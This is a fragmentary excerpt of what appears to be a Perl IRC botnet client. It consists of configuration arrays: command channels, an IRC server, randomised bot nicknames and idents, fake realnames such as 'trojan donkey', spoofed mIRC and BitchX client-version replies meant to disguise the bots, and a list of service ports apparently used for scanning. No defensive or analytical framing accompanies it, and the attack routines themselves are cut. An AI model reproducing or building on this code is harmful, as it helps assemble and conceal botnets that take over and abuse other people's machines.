...
my @admchan=("#indodax #kaskus #btc #bitcoin #airdrop #ccpower");

$servidor='irc.chating.id' unless $servidor;
...
my @nickname = ("info","cpu","pet","pacs","dino","megov","onet","xrm","tisi","parm","cico","jun",
...
my @xident = ("capadesu","Freak","cmd","index","main","php","vuln","iiris","local","capadesu","capadesu",
	"owner","crime","data","docker","doper","hash","mysql","imapd","devil","shark","crack","molinow");

my @xname = ("slidelink.net","www.Google.com","* Im to lame to read Bitchx.doc *","BitchX",
	"mIRC 6.1","* Im so lame i cant ready BitchX.doc *","Bill Gates","crew molinow","crew molinow","kotamobagu.info","nozzz",
	"Kotamobagu Crew","vTeam","Turbo","paypal","netscam","www.milw0rm.com","crew molinow","capadesubooks.web.id",
	"trojan donkey","Crew Molinow","Capadesu Inc.","Pimp Ma Shit","Pimp my ride","Freak out","Doch",
	"www.packetstormsecurity.org","www.linux.com","www.freebsd.org","Hello There","capadesubooks.web.id","takethislink.com");

#################
# Random Ports
#################
my @rports = ("6666","6667","6668","6669","7000");
...
my @Mrx = ("\001mIRC32 v5.91 K.Mardam-Bey\001","\001mIRC v6.2 Khaled Mardam-Bey\001",
	...
	"\001BitchX-1.0c17/FreeBSD 4.10-RELEASE:(c)rackrock/bX [3.0.1ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¡9] : Keep it to yourself!\001",
...
my @portas=("21","22","23","25","53","80","110","113","143","3306","4000","5900","6667","6668","6669","7000","10000","12345","31337","1994");
